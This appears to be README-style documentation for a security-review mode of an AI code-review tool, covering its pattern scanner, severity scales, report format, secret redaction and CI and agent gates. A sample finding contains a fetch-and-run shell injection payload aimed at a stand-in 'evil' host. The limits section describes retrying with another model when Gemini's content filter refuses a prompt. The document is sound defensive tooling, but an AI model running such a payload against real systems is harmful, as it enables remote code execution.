# Security review (`--security`, skill `agy-security`)

`agy-review --security` reviews code the way a security engineer would: from the attacker's side of the trust boundary, with the code that feeds the target and the code the target feeds. It combines three things that fail in different ways, so that none of them has to be trusted alone.

| Part | What it does | Can it be wrong? |
|---|---|---|
| Pattern scanner (no model) | Finds hard-coded secrets and ~25 classes of bad patterns by regex, per line, in the code under review | Secrets: rarely (high-precision formats). Other patterns: often, so they are only leads |
| Related code | Adds callees (definitions of functions the target calls) and callers (call sites, 8 lines around each) as read-only context | It is best-effort name matching, not a call graph |
| Reviewer (Antigravity model) | Traces untrusted input to dangerous sinks, checks the controls on the path, maps to CWE and OWASP, writes the attack scenario and data flow | Yes: it can misjudge. Its quoted evidence is checked against the real file; its conclusions are not |

## Standard it follows

- **Method:** threat-model first. Identify untrusted sources and dangerous sinks, trace each source to each sink along the code that is visible, and check validation, encoding, parameterisation, canonicalisation, authentication and object-level authorisation on the path.
- **Taxonomy:** OWASP Top 10 (2021) categories A01-A10 in `owasp`, and the most specific CWE the reviewer is sure of in `cwe`.
- **Severity (security meaning):** `critical` = remotely exploitable without authentication with high impact (code execution, full data access, account takeover) or a leaked live secret; `high` = exploitable by an authenticated or local attacker with high impact, or remotely with moderate impact; `medium` = needs a precondition or has limited impact; `low` = hardening gap without a direct path; `nit` = not a security issue.
- **Exploitability:** `demonstrated` (the whole attack path is visible in the code shown), `likely` (visible except a standard framework behaviour), `conditional` (needs a precondition or code that is not visible), `theoretical` (no concrete path). `theoretical` findings are capped at `medium` by the tool.
- **Priority:** P0 before merge, P1 before release, P2 planned, P3 optional. Critical is always P0.

## Report anatomy (`agy-review/v1`, `review_type: "security"`)

Everything in the normal review report, plus per finding `owasp`, `cve` (with `cve_verified: false` whenever a `cve` is present), `exploitability`, `attack_scenario`, `data_flow`; and at report level `signals[]` and `related_code[]`.

```text
- **OS command injection via shell=True** - `app.py:13` [P0 | security | confidence high | exploitability demonstrated | CWE-78 | OWASP A03:2021 Injection] (id 64a921eae6)
  Evidence:
      subprocess.call("tar czf /backup/out.tgz " + path, shell=True)
  Problem: path is concatenated into a shell string and run with shell=True.
  Attack: an attacker who controls `path` sends `x; curl evil | sh`.
  Data flow: request.args['p'] -> run_backup(path) -> subprocess.call(... shell=True)
  Fix: pass an argument list with shell=False and validate path against an allow-listed directory.
```

### What is guaranteed, and what is not

- A finding exists only if its quoted evidence exists in the cited file (see `docs/AGENTS.md`, "Why you can rely on it").
- **Static modes never send a recognised secret to the model.** (Agentic reviews cannot offer this: the reviewer reads files itself. The tool then warns and puts it in `limitations`; rotate such secrets.) A hard-coded private key (the whole PEM block, not only its header), AWS key id (also temporary `ASIA...`), GitHub (also fine-grained `github_pat_...`), GitLab, Stripe, Slack or Google token is replaced by `AKIA…[redacted 20 chars]` in the prompt, in the report and in the evidence, and is reported as a finding with `grounding: "pattern"` without asking a model. Generic `password = "..."` assignments are signals, not findings, because they are often placeholders. This redacts what the scanner recognises; it is not a data-loss-prevention system.
- **CVE ids are claims, not facts.** A model cannot reliably know which version has which CVE. The tool keeps a `CVE-YYYY-NNNN` id only if it is well formed, labels it `cve_verified: false`, and prints that it must be checked on NVD or OSV. For dependencies use a real scanner (`osv-scanner`, `npm audit`, `pip-audit`, `dotnet list package --vulnerable`, Gradle/OWASP dependency-check) in addition. The reviewer is instructed to leave `cve` empty unless it is certain.
- **Not guaranteed:** that nothing was missed. An empty report means "nothing verified in the scope that was reviewed", never "secure". This is not a replacement for SAST/DAST in CI, dependency scanning, or a human review of authentication, cryptography and payment code.

## Pattern scanner rules

`secret.private-key`, `secret.aws-key`, `secret.github-token`, `secret.stripe-live`, `secret.slack-token`, `secret.google-api-key` (reported as findings); `secret.assignment`; `inject.eval`, `inject.shell`, `inject.sql`; `xss.html`; `crypto.weak-hash`, `crypto.weak-cipher`, `crypto.weak-random`; `tls.no-verify`; `deser.unsafe`; `auth.jwt-none`; `web.cors-any`, `web.csrf-off`, `web.debug-on`; `fs.world-writable`; `xxe.parser`; `android.exported`, `android.webview`; `redirect.open`; `ssrf.fetch`. Each carries a CWE and an OWASP category. The list lives in `plugins/agy-review/scripts/lib/security.mjs` (`RULES`); add a rule there and a case in `test/`.

## Related code ("the section and its related sections")

For static targets (`--symbol`, `--file`, `--stdin`) `--security` turns on `--related`: up to 6 definitions of functions the target calls and up to 6 call sites of the functions the target defines, found with `git grep`. They are shown to the model as *not under review* context. A problem found there is reported as `scope: "context"` (listed separately, never gating) unless it is in the requested lines. Use `--no-related` to switch it off. For git targets (`--staged`, `--base`, `--commit`, working tree) the reviewer reads the surrounding code itself in read-only mode, and only findings on the changed lines gate; pre-existing issues in untouched code are listed as context.

## Chains and rules

The review is an ordinary command with an exit code, so it composes.

**Write, review, fix (agent loop):**

```text
write code -> agy-security on each new/changed function -> fix P0/P1 -> agy-security --previous -> exit 0? done : repeat (max 5)
```

**Gate on a threshold:** `--fail-on high` returns exit `10` if a verified, in-scope, medium-or-better-confidence finding of that severity or worse exists. Exit `4` means inconclusive (claims could not be verified or code was not covered) and must be treated as "not passed".

**Rules you can adopt (copy from `examples/`):**

| Where | File | Effect |
|---|---|---|
| Claude Code, project rule | `examples/claude-md-rule.md` | after Claude writes sensitive code it reviews it with `agy-security` and fixes P0/P1 |
| Codex | `examples/agents-md-rule.md` | same rule for `AGENTS.md` |
| Claude Code, automatic gate | `examples/security-gate-hook.mjs` + `examples/claude-code-hooks.json` | a `Stop` hook reviews the working tree whenever Claude finishes and sends high/critical findings back to Claude. Optional; costs one review per stop; untested by the author |
| git, before commit | `examples/pre-commit.sh` | reviews staged changes and blocks the commit on high or worse |

**Cross-check for critical code:** `--models <modelA>,<modelB>`. A finding reported by both has `agreement.count = 2`. If the models disagree by two or more severity levels the finding carries `severity_disagreement: true`; the higher severity is kept, so the gate stays safe.

## Limits to keep in mind

- Static targets show the model only the code they were given plus bounded related code. Cross-file flows beyond that appear as `limitations` or as `conditional` findings.
- Gemini's content filter occasionally refuses security prompts. If you did not name a model, the tool retries once with the first non-Gemini model in `agy models` and says so. If you named a Gemini model it does not switch; pick another with `--model`.
- Some models reject `--effort`; the tool then runs with the model default and reports it.
- Code you review is sent to Google's model. Do not review code you may not share.
